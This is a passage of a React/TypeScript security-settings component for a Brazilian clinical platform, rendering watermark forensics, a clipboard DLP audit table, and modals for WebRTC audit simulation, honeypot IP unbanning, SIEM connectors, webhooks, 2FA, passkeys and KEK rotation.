                  <span className="text-[10px] text-slate-500 font-mono">
                    Perícia realizada em: {new Date(inspectResult.verifiedAt).toLocaleString('pt-BR')}
                  </span>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-2 text-[11px] font-mono">
                  <div>
                    <span className="text-slate-400 block text-[10px]">Caracteres Zero-Width:</span>
                    <strong className="text-slate-800 dark:text-slate-200">{inspectResult.zeroWidthCharCount} caracteres</strong>
                  </div>
                  <div>
                    <span className="text-slate-400 block text-[10px]">Nível de Risco:</span>
                    <strong className="text-slate-800 dark:text-slate-200">{inspectResult.riskLevel}</strong>
                  </div>
                  <div>
                    <span className="text-slate-400 block text-[10px]">Integridade Textual:</span>
                    <strong className={inspectResult.extractedIntegrity ? 'text-emerald-600 dark:text-emerald-400' : 'text-amber-600 dark:text-amber-400'}>
                      {inspectResult.extractedIntegrity ? '100% Íntegro' : 'Parcial / Recortado'}
                    </strong>
                  </div>
                  <div>
                    <span className="text-slate-400 block text-[10px]">ID Marca d'Água:</span>
                    <strong className="text-slate-800 dark:text-slate-200">{inspectResult.payload?.watermarkId || 'N/A'}</strong>
                  </div>
                </div>

                {inspectResult.payload && (
                  <div className="p-3 rounded-lg bg-white/80 dark:bg-slate-900/80 border border-slate-200 dark:border-slate-800 space-y-1 text-xs">
                    <div className="font-bold text-slate-900 dark:text-white flex items-center gap-1.5">
                      <ShieldAlert className="w-3.5 h-3.5 text-violet-600 dark:text-violet-400" />
                      Evidências Periciais Decodificadas da Marca d'Água:
                    </div>
                    <div>• <strong>Operador Autor da Cópia:</strong> {inspectResult.payload.operatorId} {inspectResult.payload.operatorName ? `(${inspectResult.payload.operatorName})` : ''}</div>
                    <div>• <strong>Paciente Vinculado:</strong> {inspectResult.payload.patientId} {inspectResult.payload.patientName ? `(${inspectResult.payload.patientName})` : ''}</div>
                    <div>• <strong>Timestamp de Emissão:</strong> {new Date(inspectResult.payload.timestamp).toLocaleString('pt-BR')}</div>
                    <div className="truncate text-[10px] font-mono text-slate-500">
                      • <strong>Digest Canônico SHA-256:</strong> {inspectResult.payload.contentDigest}
                    </div>
                  </div>
                )}
              </div>
            )}
          </div>

          {/* Trilha WORM de Eventos de Clipboard DLP */}
          <div className="space-y-3">
            <h3 className="text-xs font-bold text-slate-900 dark:text-white uppercase tracking-wider flex items-center gap-1.5">
              <Activity className="w-4 h-4 text-violet-600 dark:text-violet-400" />
              Trilha de Auditoria WORM de Eventos de Clipboard (LGPD Art. 46)
            </h3>

            {(!dlpOverview?.recentEvents || dlpOverview.recentEvents.length === 0) ? (
              <div className="p-6 rounded-2xl bg-slate-50 dark:bg-slate-800/30 text-center text-xs text-slate-500">
                Nenhum evento recente de cópia de prontuário registrado.
              </div>
            ) : (
              <div className="overflow-x-auto rounded-2xl border border-slate-200 dark:border-slate-800">
                <table className="w-full text-left text-xs">
                  <thead className="bg-slate-50 dark:bg-slate-800 text-slate-600 dark:text-slate-300 font-semibold border-b border-slate-200 dark:border-slate-700">
                    <tr>
                      <th className="py-2.5 px-3.5">Data / Hora</th>
                      <th className="py-2.5 px-3.5">Operador</th>
                      <th className="py-2.5 px-3.5">Paciente</th>
                      <th className="py-2.5 px-3.5">Contexto</th>
                      <th className="py-2.5 px-3.5">Ação & Risco</th>
                      <th className="py-2.5 px-3.5">Status</th>
                      <th className="py-2.5 px-3.5 text-right">Tamanho</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-slate-800">
                    {dlpOverview.recentEvents.map((evt) => (
                      <tr key={evt.id} className="hover:bg-slate-50/50 dark:hover:bg-slate-800/40 transition-colors">
                        <td className="py-2.5 px-3.5 font-mono text-[11px] text-slate-500 dark:text-slate-400">
                          {new Date(evt.timestamp).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-2.5 px-3.5 font-semibold text-slate-900 dark:text-white">
                          {evt.operatorName || evt.operatorId}
                        </td>
                        <td className="py-2.5 px-3.5 text-slate-600 dark:text-slate-400 font-mono text-[11px]">
                          {evt.patientId}
                        </td>
                        <td className="py-2.5 px-3.5">
                          <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 font-semibold">
                            {evt.sourceContext}
                          </span>
                        </td>
                        <td className="py-2.5 px-3.5">
                          <div className="flex items-center gap-1.5">
                            <span className="font-semibold text-slate-700 dark:text-slate-300 text-[11px]">
                              {evt.action}
                            </span>
                            <span className={`px-1.5 py-0.5 rounded text-[9px] font-bold ${
                              evt.riskLevel === DlpRiskLevel.CRITICAL
                                ? 'bg-rose-100 text-rose-800 dark:bg-rose-950 dark:text-rose-300'
                                : evt.riskLevel === DlpRiskLevel.HIGH
                                ? 'bg-amber-100 text-amber-800 dark:bg-amber-950 dark:text-amber-300'
                                : 'bg-slate-100 text-slate-700 dark:bg-slate-800 dark:text-slate-300'
                            }`}>
                              {evt.riskLevel}
                            </span>
                          </div>
                        </td>
                        <td className="py-2.5 px-3.5">
                          <span className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                            evt.status === 'EMBEDDED_SUCCESS'
                              ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950 dark:text-emerald-300'
                              : 'bg-rose-100 text-rose-800 dark:bg-rose-950 dark:text-rose-300'
                          }`}>
                            {evt.status}
                          </span>
                        </td>
                        <td className="py-2.5 px-3.5 text-right font-mono text-[11px] text-slate-500">
                          {evt.charactersCopied} chars
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            )}
          </div>
        </div>
      )}

      {/* Modal de Simulação P2P WebRTC */}
      {showSimulateModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-md w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <Video className="w-5 h-5 text-teal-600 dark:text-teal-400" />
                Simulador de Integridade WebRTC
              </h3>
              <button 
                onClick={() => setShowSimulateModal(false)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
              Esta simulação gerará dois certificados DTLS sintéticos conformes à RFC 8122, computará o par de Safety Numbers (SAS) e registrará a auditoria na hash-chain WORM.
            </p>

            <form onSubmit={handleSimulateWebrtcAudit} className="space-y-3.5">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  ID do Paciente:
                </label>
                <input
                  type="text"
                  required
                  value={simPatientId}
                  onChange={(e) => setSimPatientId(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Versão DTLS:
                </label>
                <select
                  value={simDtlsVersion}
                  onChange={(e) => setSimDtlsVersion(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                >
                  <option value="DTLS 1.3">DTLS 1.3 (RFC 9147 Padrão Ouro)</option>
                  <option value="DTLS 1.2">DTLS 1.2 (RFC 6347)</option>
                </select>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Ciphersuite SRTP:
                </label>
                <select
                  value={simCipherSuite}
                  onChange={(e) => setSimCipherSuite(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                >
                  <option value={WebRtcCipherSuite.SRTP_AEAD_AES_256_GCM}>SRTP_AEAD_AES_256_GCM (Padrão Ouro RFC-001)</option>
                  <option value={WebRtcCipherSuite.SRTP_AEAD_AES_128_GCM}>SRTP_AEAD_AES_128_GCM (Aceitável)</option>
                  <option value={WebRtcCipherSuite.SRTP_AES128_CM_HMAC_SHA1_80}>SRTP_AES128_CM_HMAC_SHA1_80 (Legado)</option>
                </select>
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowSimulateModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={simulatingWebrtc}
                  className="px-4 py-2 rounded-xl bg-teal-600 hover:bg-teal-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {simulatingWebrtc ? 'Auditando...' : 'Iniciar Simulação e Selar'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Desbloqueio (Unban) de IP do Honeypot */}
      {unbanModalTarget && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-md w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <Ban className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
                Desbloquear IP da Quarentena
              </h3>
              <button 
                onClick={() => setUnbanModalTarget(null)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="p-3 rounded-xl bg-slate-50 dark:bg-slate-800/60 border border-slate-200 dark:border-slate-700 text-xs space-y-1">
              <div>Endereço IP: <strong className="font-mono text-slate-900 dark:text-white">{unbanModalTarget.ipAddress}</strong></div>
              <div>Rota Bloqueada: <strong className="font-mono text-rose-600 dark:text-rose-400">{unbanModalTarget.path}</strong></div>
              <div>Tentativas Registradas: <strong>{unbanModalTarget.blockedAttemptsCount}</strong></div>
            </div>

            <form onSubmit={handleUnbanIp} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Justificativa Formal (Gravada na Trilha WORM):
                </label>
                <input
                  type="text"
                  required
                  placeholder="Ex: Falso positivo auditado / Teste de penetração autorizado"
                  value={unbanReason}
                  onChange={(e) => setUnbanReason(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white focus:outline-none focus:ring-2 focus:ring-emerald-500"
                />
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setUnbanModalTarget(null)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={loadingHardening || !unbanReason.trim()}
                  className="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {loadingHardening ? 'Desbloqueando...' : 'Confirmar e Gravar no WORM'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Criação de Novo Conector SIEM */}
      {showCreateSiemModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-lg w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <Radio className="w-5 h-5 text-sky-600 dark:text-sky-400" />
                Cadastrar Novo Conector SIEM Corporativo
              </h3>
              <button 
                onClick={() => setShowCreateSiemModal(false)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleCreateSiemConnector} className="space-y-3.5">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Selecione o Provedor SIEM:
                </label>
                <div className="grid grid-cols-4 gap-2">
                  {(['datadog', 'splunk', 'elastic', 'generic'] as SiemProvider[]).map((p) => (
                    <button
                      type="button"
                      key={p}
                      onClick={() => handleProviderChange(p)}
                      className={`p-2 rounded-xl border text-xs font-bold uppercase transition-all ${
                        newSiemProvider === p
                          ? 'bg-sky-50 dark:bg-sky-950 border-sky-500 text-sky-700 dark:text-sky-300 ring-2 ring-sky-500/30'
                          : 'bg-slate-50 dark:bg-slate-800 border-slate-200 dark:border-slate-700 text-slate-600 dark:text-slate-400'
                      }`}
                    >
                      {p}
                    </button>
                  ))}
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Nome do Conector:
                </label>
                <input
                  type="text"
                  required
                  value={newSiemName}
                  onChange={(e) => setNewSiemName(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Endpoint HTTPS:
                </label>
                <input
                  type="url"
                  required
                  value={newSiemUrl}
                  onChange={(e) => setNewSiemUrl(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono"
                />
              </div>

              <div className="grid grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                    Chave de API / Token:
                  </label>
                  <input
                    type="password"
                    placeholder="Chave secreta"
                    value={newSiemApiKey}
                    onChange={(e) => setNewSiemApiKey(e.target.value)}
                    className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono"
                  />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                    Index / Source:
                  </label>
                  <input
                    type="text"
                    placeholder="Ex: clinical-platform"
                    value={newSiemIndexOrSource}
                    onChange={(e) => setNewSiemIndexOrSource(e.target.value)}
                    className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono"
                  />
                </div>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1.5">
                  Eventos Inscritos:
                </label>
                <div className="grid grid-cols-2 gap-1.5 text-xs">
                  {[
                    { id: 'SECURITY_ALERT' as WebhookEventType, label: '🚨 Alertas de Segurança' },
                    { id: 'AUTH_LOGIN_FAILED' as WebhookEventType, label: '⛔ Falhas de Login' },
                    { id: 'BACKUP_RESTORE' as WebhookEventType, label: '🔄 Disaster Recovery' },
                    { id: 'DATA_EXPORT_LGPD' as WebhookEventType, label: '📦 Exportação LGPD' },
                    { id: 'CONSENT_REVOKED' as WebhookEventType, label: '⚠️ Revogação de TCLE' },
                    { id: 'DOCUMENT_SIGNED' as WebhookEventType, label: '✍️ Laudos CFP' }
                  ].map((ev) => (
                    <label 
                      key={ev.id}
                      className={`p-2 rounded-xl border flex items-center gap-2 cursor-pointer transition-colors ${
                        newSiemEvents.includes(ev.id)
                          ? 'bg-sky-50 border-sky-300 dark:bg-sky-950/40 dark:border-sky-700 text-sky-900 dark:text-sky-200 font-semibold'
                          : 'bg-white dark:bg-slate-800/40 border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300'
                      }`}
                    >
                      <input
                        type="checkbox"
                        checked={newSiemEvents.includes(ev.id)}
                        onChange={() => {
                          if (newSiemEvents.includes(ev.id)) {
                            setNewSiemEvents(newSiemEvents.filter(x => x !== ev.id));
                          } else {
                            setNewSiemEvents([...newSiemEvents, ev.id]);
                          }
                        }}
                        className="rounded text-sky-600 focus:ring-sky-500"
                      />
                      <span className="text-[11px]">{ev.label}</span>
                    </label>
                  ))}
                </div>
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowCreateSiemModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={loadingSiemConnectors || newSiemEvents.length === 0}
                  className="px-4 py-2 rounded-xl bg-sky-600 hover:bg-sky-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {loadingSiemConnectors ? 'Salvando...' : 'Salvar Conector SIEM'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Inspeção do Teste SIEM */}
      {siemTestResultModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-2xl w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <div className="flex items-center gap-2">
                <Radio className="w-5 h-5 text-sky-600 dark:text-sky-400" />
                <h3 className="text-base font-bold text-slate-900 dark:text-white">
                  Teste de Integração SIEM: {siemTestResultModal.connectorName}
                </h3>
              </div>
              <button 
                onClick={() => setSiemTestResultModal(null)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <div className="flex items-center gap-3 text-xs">
              <span className={`px-2.5 py-1 rounded-full font-bold ${
                siemTestResultModal.result.success
                  ? 'bg-emerald-100 text-emerald-800 dark:bg-emerald-950/60 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-700'
                  : 'bg-rose-100 text-rose-800 dark:bg-rose-950/60 dark:text-rose-300 border border-rose-300 dark:border-rose-700'
              }`}>
                HTTP {siemTestResultModal.result.httpStatus} • {siemTestResultModal.result.success ? 'Conexão Estabelecida' : 'Falha na Resposta'}
              </span>
              <span className="font-mono text-slate-500">
                Latência: <strong>{siemTestResultModal.result.latencyMs}ms</strong>
              </span>
            </div>

            <div className="space-y-1.5">
              <span className="text-[11px] text-slate-400 font-semibold uppercase">
                Cabeçalhos HTTP Transmitidos:
              </span>
              <pre className="p-3 bg-slate-900 text-slate-200 rounded-xl font-mono text-[11px] overflow-x-auto">
                {JSON.stringify(siemTestResultModal.result.headersSent, null, 2)}
              </pre>
            </div>

            <div className="space-y-1.5">
              <span className="text-[11px] text-slate-400 font-semibold uppercase">
                Payload Formatado pelo Conector (Esquema do Provedor):
              </span>
              <pre className="p-3 bg-slate-900 text-emerald-400 rounded-xl font-mono text-[11px] overflow-x-auto max-h-60 overflow-y-auto">
                {JSON.stringify(siemTestResultModal.result.formattedPayload, null, 2)}
              </pre>
            </div>

            <div className="flex justify-end pt-2 border-t border-slate-100 dark:border-slate-800">
              <button
                onClick={() => setSiemTestResultModal(null)}
                className="px-4 py-2 rounded-xl bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-800 dark:text-slate-200 text-xs font-semibold cursor-pointer"
              >
                Fechar Inspeção
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Modal de Criação de Novo Webhook */}
      {showCreateWebhookModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-lg w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-2 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <Bell className="w-5 h-5 text-indigo-600 dark:text-indigo-400" />
                Cadastrar Novo Webhook de Segurança
              </h3>
              <button 
                onClick={() => setShowCreateWebhookModal(false)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold"
              >
                ✕
              </button>
            </div>

            <form onSubmit={handleCreateWebhook} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  URL de Destino (Endpoint HTTPS):
                </label>
                <input
                  type="url"
                  required
                  placeholder="https://seu-siem.com/webhooks/terapiainfoco"
                  value={newWebhookUrl}
                  onChange={(e) => setNewWebhookUrl(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white font-mono"
                />
                <span className="text-[10px] text-slate-400 mt-1 block">
                  Exige HTTPS para garantir o sigilo em trânsito de acordo com as normas do CFP e LGPD.
                </span>
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Descrição / Finalidade do Endpoint:
                </label>
                <input
                  type="text"
                  placeholder="Ex: Integração SIEM Splunk / Monitoramento SOC"
                  value={newWebhookDescription}
                  onChange={(e) => setNewWebhookDescription(e.target.value)}
                  className="w-full px-3.5 py-2 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-xs text-slate-900 dark:text-white"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-2">
                  Eventos Assinados para Notificação:
                </label>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
                  {[
                    { id: 'SECURITY_ALERT' as WebhookEventType, label: '🚨 Alertas de Segurança & Rate Limit' },
                    { id: 'AUTH_LOGIN_FAILED' as WebhookEventType, label: '⛔ Falhas Repetidas de Login' },
                    { id: 'BACKUP_RESTORE' as WebhookEventType, label: '🔄 Restauração de Backup (Disaster Recovery)' },
                    { id: 'DATA_EXPORT_LGPD' as WebhookEventType, label: '📦 Exportação de Dados LGPD Art. 18' },
                    { id: 'CONSENT_REVOKED' as WebhookEventType, label: '⚠️ Revogação de Consentimento do Paciente' },
                    { id: 'DOCUMENT_SIGNED' as WebhookEventType, label: '✍️ Assinatura Qualificada de Laudo CFP' }
                  ].map((ev) => (
                    <label 
                      key={ev.id}
                      className={`p-2.5 rounded-xl border flex items-center gap-2 cursor-pointer transition-colors ${
                        newWebhookEvents.includes(ev.id)
                          ? 'bg-indigo-50 border-indigo-300 dark:bg-indigo-950/40 dark:border-indigo-700 text-indigo-900 dark:text-indigo-200 font-semibold'
                          : 'bg-white dark:bg-slate-800/40 border-slate-200 dark:border-slate-700 text-slate-700 dark:text-slate-300'
                      }`}
                    >
                      <input
                        type="checkbox"
                        checked={newWebhookEvents.includes(ev.id)}
                        onChange={() => toggleEventSelection(ev.id)}
                        className="rounded text-indigo-600 focus:ring-indigo-500"
                      />
                      <span className="text-[11px]">{ev.label}</span>
                    </label>
                  ))}
                </div>
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowCreateWebhookModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={loadingWebhooks || newWebhookEvents.length === 0}
                  className="px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {loadingWebhooks ? 'Salvando...' : 'Salvar e Gerar Segredo'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Desativação de 2FA */}
      {showDisableModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-md w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <h3 className="text-lg font-bold text-slate-900 dark:text-white flex items-center gap-2">
              <FileLock2 className="w-5 h-5 text-rose-600 dark:text-rose-400" />
              Confirmar Desativação do 2FA
            </h3>
            <p className="text-xs text-slate-600 dark:text-slate-400">
              Digite sua senha de acesso para confirmar a remoção da autenticação de dois fatores da sua conta.
            </p>

            <form onSubmit={handleDisable2FA} className="space-y-4">
              <input
                type="password"
                placeholder="Sua senha atual"
                value={disablePassword}
                onChange={(e) => setDisablePassword(e.target.value)}
                required
                className="w-full px-4 py-2.5 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white text-sm"
              />

              <div className="flex justify-end gap-3">
                <button
                  type="button"
                  onClick={() => setShowDisableModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={loading || !disablePassword}
                  className="px-4 py-2 rounded-xl bg-rose-600 hover:bg-rose-700 text-white font-semibold text-xs disabled:opacity-50"
                >
                  {loading ? 'Processando...' : 'Confirmar e Desativar'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Cadastro de Nova Passkey */}
      {showAddPasskeyModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-md w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <Fingerprint className="w-5 h-5 text-violet-600 dark:text-violet-400" />
                Cadastrar Nova Passkey / Biometria
              </h3>
              <button 
                onClick={() => setShowAddPasskeyModal(false)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
              Dê um nome para identificar o seu dispositivo. Ao clicar em <strong>Iniciar Leitura</strong>, 
              o sistema operacional solicitará sua confirmação biométrica (TouchID, FaceID, Windows Hello ou chave FIDO2).
            </p>

            <form onSubmit={handleRegisterPasskey} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-700 dark:text-slate-300 mb-1">
                  Nome do Dispositivo:
                </label>
                <input
                  type="text"
                  placeholder="Ex: MacBook Consultório (TouchID)"
                  value={newPasskeyFriendlyName}
                  onChange={(e) => setNewPasskeyFriendlyName(e.target.value)}
                  required
                  autoFocus
                  className="w-full px-4 py-2.5 rounded-xl bg-slate-50 dark:bg-slate-800 border border-slate-300 dark:border-slate-700 text-slate-900 dark:text-white text-sm focus:outline-none focus:ring-2 focus:ring-violet-500"
                />
              </div>

              <div className="p-3 rounded-xl bg-violet-50 dark:bg-violet-950/30 border border-violet-200 dark:border-violet-800 text-[11px] text-violet-800 dark:text-violet-300 space-y-1">
                <p className="font-semibold">🛡️ Chave Privada Blindada no Hardware</p>
                <p>Nenhuma biometria ou dado pessoal deixa o seu computador. Apenas a chave pública é compartilhada com o servidor em conformidade com o Art. 46 da LGPD.</p>
              </div>

              <div className="flex justify-end gap-2 pt-2 border-t border-slate-100 dark:border-slate-800">
                <button
                  type="button"
                  onClick={() => setShowAddPasskeyModal(false)}
                  className="px-4 py-2 rounded-xl text-xs font-semibold text-slate-600 dark:text-slate-400 hover:bg-slate-100 dark:hover:bg-slate-800 cursor-pointer"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  disabled={registeringPasskey || !newPasskeyFriendlyName.trim()}
                  className="inline-flex items-center gap-1.5 px-4 py-2 rounded-xl bg-violet-600 hover:bg-violet-700 text-white text-xs font-semibold shadow-sm transition-colors cursor-pointer disabled:opacity-50"
                >
                  {registeringPasskey ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>Aguardando Sensor...</span>
                    </>
                  ) : (
                    <>
                      <Fingerprint className="w-3.5 h-3.5" />
                      <span>Iniciar Leitura Biométrica</span>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Modal de Rotação de Chave Mestre KEK */}
      {showRotateKmsModal && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white dark:bg-slate-900 rounded-3xl max-w-md w-full p-6 border border-slate-200 dark:border-slate-800 shadow-2xl space-y-4">
            <div className="flex items-center justify-between pb-3 border-b border-slate-100 dark:border-slate-800">
              <h3 className="text-base font-bold text-slate-900 dark:text-white flex items-center gap-2">
                <KeyRound className="w-5 h-5 text-amber-600 dark:text-amber-400" />
                Rotacionar Chave Mestre KEK (NIST SP 800-57)
              </h3>
              <button 
                onClick={() => setShowRotateKmsModal(false)}
                className="text-slate-400 hover:text-slate-600 dark:hover:text-white text-xs font-bold cursor-pointer"
              >
                ✕
              </button>
            </div>

            <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
              Esta operação gera uma nova versão de KEK (AES-256-GCM) no repositório seguro do KMS.
              A chave atual passará ao estado <strong>ROTATED</strong> e permanecerá ativa para leitura histórica.
            </p>

